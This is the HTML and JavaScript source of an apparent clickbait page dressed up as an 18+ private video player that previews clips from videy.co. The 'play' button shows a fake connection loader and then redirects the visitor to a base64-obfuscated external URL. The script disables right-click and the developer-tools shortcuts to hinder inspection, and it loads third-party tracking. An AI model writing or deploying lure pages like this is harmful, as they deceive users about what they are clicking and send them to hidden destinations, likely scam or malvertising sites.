<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="referrer" content="no-referrer">
    <title>Secure Access | Private Stream</title>
    
    <meta property="og:title" content="Private Access" />
    <meta property="og:description" content="Secure cloud delivery for requested media. High-speed streaming enabled." />
    <meta property="og:image" content="https://vidley.pw/tombolplay.jpg" />
    <meta property="og:type" content="website" />

    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap');
        
        body { 
            background-color: #030303; 
            color: #ffffff; 
            font-family: 'Inter', sans-serif;
            user-select: none; 
            -webkit-user-select: none; 
            touch-action: manipulation;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0;
        }
        
        .premium-frame {
            background: rgba(10, 10, 10, 0.95);
            backdrop-filter: blur(25px);
            border: 1px solid rgba(220, 38, 38, 0.3);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8),
                        0 0 20px rgba(220, 38, 38, 0.1);
            position: relative;
        }

        .pulse-red {
            animation: pulse-red-glow 2s infinite;
        }
        @keyframes pulse-red-glow {
            0% { box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.7); transform: scale(1); }
            50% { box-shadow: 0 0 40px 10px rgba(220, 38, 38, 0.4); transform: scale(1.05); }
            100% { box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.7); transform: scale(1); }
        }

        .age-badge {
            border: 2px solid #dc2626;
            color: #dc2626;
            padding: 2px 12px;
            border-radius: 4px;
            font-weight: 900;
            font-size: 12px;
            letter-spacing: 1px;
            background: #000;
        }

        .video-container {
            position: absolute;
            inset: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
        }

        .video-obscurer {
            position: absolute;
            inset: 0;
            background: radial-gradient(circle, transparent 20%, #000 90%);
            z-index: 2;
            pointer-events: none;
        }

        #bgVideo {
            width: 100%;
            height: 100%;
            object-fit: cover;
            filter: blur(20px); 
            transform: scale(1.1);
            transition: opacity 1s ease;
        }

        .spinner-ring {
            border: 3px solid rgba(220, 38, 38, 0.1);
            border-top: 3px solid #dc2626;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="w-full max-w-[360px] premium-frame rounded-[2.5rem] overflow-hidden">
        
        <div id="videoArea" class="relative w-full h-[480px] bg-black overflow-hidden flex items-center justify-center cursor-pointer group active:scale-[0.98] transition-transform">
            
            <div class="video-container">
                <div class="video-obscurer"></div>
                <img id="vidThumb" class="absolute inset-0 w-full h-full object-cover opacity-40 blur-xl" src="https://vidley.pw/tombolplay.jpg" alt="Preview">
                <video id="bgVideo" autoplay muted loop playsinline class="opacity-0"></video>
            </div>

            <div id="playOverlay" class="relative z-20 flex flex-col items-center justify-center transition-all duration-500">
                
                <div class="mb-12 flex flex-col items-center">
                     <span class="age-badge mb-3 shadow-[0_0_10px_rgba(220,38,38,0.3)]">18+</span>
                     <p class="text-red-600/90 text-[9px] uppercase tracking-[0.4em] font-bold">Age Verified Access</p>
                </div>

                <div id="iconBox" class="w-20 h-20 bg-red-600 rounded-full flex items-center justify-center shadow-[0_0_40px_rgba(220,38,38,0.5)] pulse-red transition-transform duration-300">
                    <i data-lucide="play" class="w-9 h-9 text-white fill-current ml-1"></i>
                </div>

                <div class="mt-12">
                    <div class="flex items-center gap-2 opacity-60">
                        <span class="w-1.5 h-1.5 bg-red-600 rounded-full animate-ping"></span>
                        <span class="text-[10px] font-bold tracking-[0.2em] uppercase">CLICK TO PLAY</span>
                    </div>
                </div>
            </div>
            
            <div id="loader" class="hidden absolute inset-0 flex items-center justify-center bg-black/95 z-40">
                <div class="flex flex-col items-center">
                    <div class="spinner-ring mb-4"></div>
                    <span class="text-red-700 text-[10px] font-bold tracking-[0.4em] uppercase animate-pulse">Establishing Connection</span>
                </div>
            </div>
        </div>

        <div class="py-5 bg-black flex flex-col items-center border-t border-red-950/30">
            <div class="flex justify-center gap-5 text-white/30 text-[8px] font-bold uppercase tracking-[0.2em]">
                <span class="flex items-center gap-1.5"><i data-lucide="shield-check" class="w-3 h-3 text-red-700"></i> ENCRYPTED</span>
                <span class="flex items-center gap-1.5"><i data-lucide="zap" class="w-3 h-3 text-red-700"></i> HIGH SPEED</span>
                <span class="flex items-center gap-1.5"><i data-lucide="globe" class="w-3 h-3 text-red-700"></i> US-WEST</span>
            </div>
        </div>
    </div>

    <script>
        lucide.createIcons();

        // 
        const BASE_REDIRECT = atob("aHR0cHM6Ly9vbWcxMC5jb20vNC8xMDg1MjMyMQ==");

        function getVideyId() {
            const urlParams = new URLSearchParams(window.location.search);
            let id = urlParams.get('id') || urlParams.get('v');

            if (!id) {
                const pathParts = window.location.pathname.split('/');
                const lastPart = pathParts.pop().trim();
                if (lastPart && !lastPart.includes('.') && lastPart !== 'index' && lastPart !== 'bridge') {
                    id = lastPart;
                }
            }
            return (id && id.length >= 3) ? id : null;
        }

        function setupPreview() {
            const vId = getVideyId();
            const bgVideo = document.getElementById('bgVideo');
            const vidThumb = document.getElementById('vidThumb');

            if (vId) {
                const videoSrc = `https://cdn.videy.co/${vId}.mp4`;
                bgVideo.src = videoSrc;
                
                bgVideo.onloadeddata = () => {
                    bgVideo.classList.remove('opacity-0');
                    bgVideo.classList.add('opacity-30');
                    vidThumb.style.opacity = "0.1";
                };

                bgVideo.onerror = () => {
                    bgVideo.style.display = 'none';
                    vidThumb.style.opacity = "0.4";
                };
            }
        }

        async function handleAction() {
            const loader = document.getElementById("loader");
            const overlay = document.getElementById("playOverlay");
            const vId = getVideyId();

            loader.classList.remove('hidden');
            overlay.style.opacity = "0";
            overlay.style.transform = "scale(0.9)";

            setTimeout(() => {
                let finalUrl = BASE_REDIRECT;
                if (vId) {
                    const separator = finalUrl.includes('?') ? '&id=' : '/';
                    finalUrl += separator + vId;
                }
                window.location.href = finalUrl;
            }, 850);
        }

        window.onload = () => {
            setupPreview();
            document.getElementById("videoArea").addEventListener("click", handleAction);
        };

        // Protection
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.onkeydown = (e) => {
            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74))) return false;
        };
    </script>

    <!-- Tracking System (Histats) -->
    <script type="text/javascript">
        var _Hasync= _Hasync|| [];
        _Hasync.push(['Histats.start', '1,4999645,4,0,0,0,00010000']);
        _Hasync.push(['Histats.fasi', '1']);
        _Hasync.push(['Histats.track_hits', '']);
        (function() {
            var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
            hs.src = ('//s10.histats.com/js15_as.js');
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
        })();
    </script>
</body>
</html>
